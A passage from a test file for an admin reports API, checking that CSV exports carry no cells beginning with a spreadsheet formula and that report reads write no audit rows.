    expect(startsFormula.test(unmitigated), 'the scan no longer matches a live formula').toBe(true);
    expect(outstanding.csv).not.toMatch(startsFormula);
    expect(byTour.csv).not.toMatch(startsFormula);
  });

  /* ------------------------------------------------------- Writes nothing */

  it('writes no audit row for any of the four reads', async () => {
    const before = await auditRowCount();
    const api = ownerApi();
    await api.admin.reports.summary(MARCH);
    await api.admin.reports.byTour(MARCH);
    await api.admin.reports.outstanding(MARCH);
    await api.admin.reports.csv({ ...MARCH, report: 'outstanding' });
    expect(await auditRowCount()).toBe(before);
  });
});
